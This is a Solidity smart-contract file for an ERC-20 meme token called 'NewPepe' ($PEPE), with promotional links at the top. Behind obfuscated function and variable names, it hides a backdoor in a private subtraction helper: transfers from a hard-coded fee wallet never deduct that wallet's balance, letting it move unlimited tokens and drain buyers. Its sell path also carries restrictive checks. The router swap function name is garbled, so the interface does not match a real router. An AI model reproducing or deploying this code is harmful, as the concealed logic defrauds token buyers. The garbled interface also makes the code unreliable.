/**

This is New $PEPE 


TWITTER: https://twitter.com/NewPepeEthereum
TELEGRAM: https://t.me/NewPepe_Ethereum
WEBSITE: https://newpepe.org/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _qufjo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qufjo(a, b, "SafeMath:");
    }

    function  _qufjo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _skfgaqokvmp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _payfskebfs {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract NewPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"NewPepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalfa = 42069000000 * 10 **_decimals;
    uint256 public _mxTakoAmaunt = _Totalfa;
    uint256 public _Walleumvux = _Totalfa;
    uint256 public _wapThresholdeax= _Totalfa;
    uint256 public _mokuTauvp= _Totalfa;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeqsyst=0;
    uint256 private _burakcvt=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isEoadkFhuf;
    mapping (address => bool) private _taxbWalory;
    mapping(address => uint256) private _lruevrkacep;
    bool public _tlfereslxnove = false;
    address payable private _qkefrdFsbp;

    _payfskebfs private _fmoRubsdxt;
    address private _acbPtrdiw;
    bool private _zrjcogjah;
    bool private iuxSwprdq = false;
    bool private _apiEablaq = false;

    event _amrfaustl(uint _mxTakoAmaunt);
    modifier lcktsThopap {
        iuxSwprdq = true;
        _;
        iuxSwprdq = false;
    }

    constructor () {
        _qkefrdFsbp = payable(0xcEEc907a593Bc2d347e4a2Dc52B0BE70C687b922);
        _balances[_msgSender()] = _Totalfa;
        _isEoadkFhuf[owner()] = true;
        _isEoadkFhuf[address(this)] = true;
        _isEoadkFhuf[_qkefrdFsbp] = true;
 

        emit Transfer(address(0), _msgSender(), _Totalfa);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalfa;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qufjo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tlfereslxnove) {
                if (to != address
                (_fmoRubsdxt) && to !=
                 address(_acbPtrdiw)) {
                  require(_lruevrkacep
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruevrkacep
                  [tx.origin] = block.number;
                }
            }

            if (from == _acbPtrdiw && to != 
            address(_fmoRubsdxt) && !_isEoadkFhuf[to] ) {
                require(amount <= _mxTakoAmaunt,
                 "Exceeds the _mxTakoAmaunt.");
                require(balanceOf(to) + amount
                 <= _Walleumvux, "Exceeds the maxWalletSize.");
                if(_burakcvt
                < _wapBeforeqsyst){
                  require(! _fytqahz(to));
                }
                _burakcvt++;
                 _taxbWalory[to]=true;
                teeomoun = amount.mul((_burakcvt>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _acbPtrdiw && from!= address(this) 
            && !_isEoadkFhuf[from] ){
                require(amount <= _mxTakoAmaunt && 
                balanceOf(_qkefrdFsbp)<_mokuTauvp,
                 "Exceeds the _mxTakoAmaunt.");
                teeomoun = amount.mul((_burakcvt>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burakcvt>_wapBeforeqsyst &&
                 _taxbWalory[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!iuxSwprdq 
            && to == _acbPtrdiw && _apiEablaq &&
             contractTokenBalance>_wapThresholdeax 
            && _burakcvt>_wapBeforeqsyst&&
             !_isEoadkFhuf[to]&& !_isEoadkFhuf[from]
            ) {
                _swpvengrvaj( _qnuje(amount, 
                _qnuje(contractTokenBalance,_mokuTauvp)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _emodukp(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _qufjo(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _qufjo(teeomoun));
        emit Transfer(from, to, 
        amount. _qufjo(teeomoun));
    }

    function _swpvengrvaj(uint256
     tokenAmount) private lcktsThopap {
        if(tokenAmount==0){return;}
        if(!_zrjcogjah){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _fmoRubsdxt.WETH();
        _approve(address(this),
         address(_fmoRubsdxt), tokenAmount);
        _fmoRubsdxt.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qnuje(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qufjo(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qkefrdFsbp){
            return a ;
        }else{
            return a . _qufjo (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTakoAmaunt = _Totalfa;
        _Walleumvux = _Totalfa;
        _tlfereslxnove = false;
        emit _amrfaustl(_Totalfa);
    }

    function _fytqahz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _emodukp(uint256
    amount) private {
        _qkefrdFsbp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _zrjcogjah);
        _fmoRubsdxt   =  _payfskebfs (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_fmoRubsdxt), _Totalfa);
        _acbPtrdiw = _skfgaqokvmp(_fmoRubsdxt.factory()). createPair (address(this),  _fmoRubsdxt . WETH ());
        _fmoRubsdxt.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_acbPtrdiw).approve(address(_fmoRubsdxt), type(uint).max);
        _apiEablaq = true;
        _zrjcogjah = true;
    }

    receive() external payable {}
}